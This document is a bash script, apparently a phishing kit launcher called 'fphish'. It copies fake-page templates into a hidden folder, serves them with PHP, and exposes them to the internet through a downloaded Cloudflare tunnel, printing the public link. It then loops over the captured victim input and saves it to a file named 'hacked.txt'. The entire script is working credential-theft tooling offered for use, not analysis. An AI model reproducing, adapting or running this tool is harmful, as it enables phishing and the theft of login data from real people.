#!/usr/bin/bash 
# made by prince kumar 
# date 28 jan 2022
# check for requirements 
trap user_intrupt SIGINT
trap user_intrupt SIGTSTP
user_intrupt(){
	printf " \n ${w}\n"
	printf " ${r}[${w}!${r}]---->>${p} Exiting fphish"
	printf " \n"
	sleep 1
	exit 1
}
# make a banner function 
banner(){
    clear
    echo -ne "≋f≋p≋h≋i≋s≋h≋ "
    echo -e "\033[0;1m MADE BY PRINCE"
}
req(){
    printf "${r}_______ ${p} checking for requirements ${r}_______\n"
	# CHECK if this is termux or not 
	if [[ -d "/data/data/com.termux/files/home" ]];then
	if [[ `command -v proot` ]];then 
	echo ""
	else
	echo -e "${g}+++++${y}Installing proot${g}+++++" 
	 pkg install proot resolv-conf -y
	 fi
	 fi
	command -v php 2>&1 > /dev/null || { echo -e "${g}+++++${y}Installing php${g}+++++" ; apt-get install php -y; }
	command -v curl 2>&1 > /dev/null || { echo -e  "${g}+++++${y}Installing curl${g}+++++" ; apt-get install curl -y ; }
    command -v unzip 2>&1 > /dev/null || { echo -e "${g}+++++${y}Installing unzip${g}+++++" ; apt-get install unzip -y ;}
	command -v wget 2>&1 > /dev/null || { echo -e "${g}+++++${y}Installing wget${g}+++++" ; apt-get install wget -y ; }
}
req
banner
#Get the pid and kill the php process...
pidkill(){
	id=$(pidof php)
	kill $id > /dev/null 2>&1
}
#make function to check the files make a hiden function 
hidden(){
	if [ -d .pweb ];then
		rm -rf .pweb
		mkdir .pweb
		echo " "
	else
		mkdir .pweb
	fi
}
hidden 
# now move the all content to this folder 
mov(){
	# Ask for theh the template
	echo -e "\033[32;1m Choose the server "
	echo -ne "\033[31;1m[01] \033[33;1m  New\n"
	echo -ne "\033[31;1m[02] \033[33;1m  Old\n"
	read u_option # reading for user options 
	if [[ $u_option == "1" ]] || [[ $u_option == "01" ]];then
	cp -R server1/* .pweb > /dev/null
	elif  [[ $u_option == "2" ]] || [[ $u_option == "02" ]];then
    cp -R server/* .pweb > /dev/null 
	else 
	echo -ne "\033[31;1m Invalid options"
	exit 1
	fi	
	}
mov
# now make a function to start localhost 
localserver(){
	 ran=$((RANDOM % 100))
	 php -S 127.0.0.1:88$ran -t .pweb > /dev/null 2>&1 & sleep 4
	 echo -e "\e[34;1m[~] Localhost started on http://127.0.0.1:88$ran"
}
# now start the cloudflare
start_cloud(){
    # remove the previous log file
    rm -rf .pk.txt > /dev/null 2>&1 
    # now ask the url 
	ran=$((RANDOM % 100))
    echo -e "\e[34;1m [~] Starting php server : "
    php -S 127.0.0.1:88${ran} -t .pweb > /dev/null 2>&1 & sleep 4
    echo -e "\e[0;1m Starting clodflare.. "
    #check fi it is termux or not ..$link
    if [[ `command -v termux-chroot` ]];then
    sleep 3 && termux-chroot ./cloudflare tunnel -url http://127.0.0.1:88${ran} --logfile .pk.txt > /dev/null 2>&1 & #throw all the process in background .. 
    else
    sleep 3 && ./cloudflare tunnel -url http://127.0.0.1:88${ran} --logfile .pk.txt > /dev/null 2>&1 & 
    fi
    # now extract the link from the logfile .. 
    sleep 8
    clear
    banner
    echo -ne "\e[36;1m Link: "
    cat .pk.txt | grep "trycloudflare" | cut -d "|" -f2 | cut -d "}" -f2 
}
#make a function to download the cloudflared 
download(){
    wget --no-check-certificate $1 -O cloudflare
    chmod +x cloudflare 
}
#first check the platform of the machine 
check_platform(){
if [[ -e cloudflare ]];then
    echo -e "\e[36;1m[~] Cloudflared already installed ."
else
    echo -e "\e[32;1m Downloding coludflared"
    host=$(uname -m)
    if [[($host == "arm") || ($host == "Android")]];then
    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
    elif [[ $host == "aarch64" ]];then
    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
    elif [[ $host == "x86_64" ]];then
    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    else 
    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
    fi
fi
}
# now make a function to start the localhost server
ask_server(){
    echo -e "\033[36;1m [~] Choose the option: "
	echo -e "\e[35;1m [01] Localhost (for devloper)"
	echo -e "\e[35;1m [02] Cloudflare "
    read port 
	if [[( $port == "01") || ( $port == "1")]];then
	localserver
	elif [[( $port == "02") || ( $port == "2")]];then
	check_platform
	start_cloud
	else 
	echo -e "\e[31;1m[!] Invalid option: "
	user_intrupt
	fi
}
ask_server
# make a function to check the data 
user_data(){
   while true;do
		if [[ -f .pweb/userlog.txt ]];then
			echo -e "${g}[${w}+${g}] ${y} User data found ${w}"
			echo " "
			cat .pweb/userlog.txt
			echo -e "\n"
			cat .pweb/userlog.txt >> hacked.txt
			rm -rf .pweb/userlog.txt
			echo -e "${w}[${r}+${w}] ${y} Saving data into hacked.txt"
			echo " "
		fi
    done
}
user_data
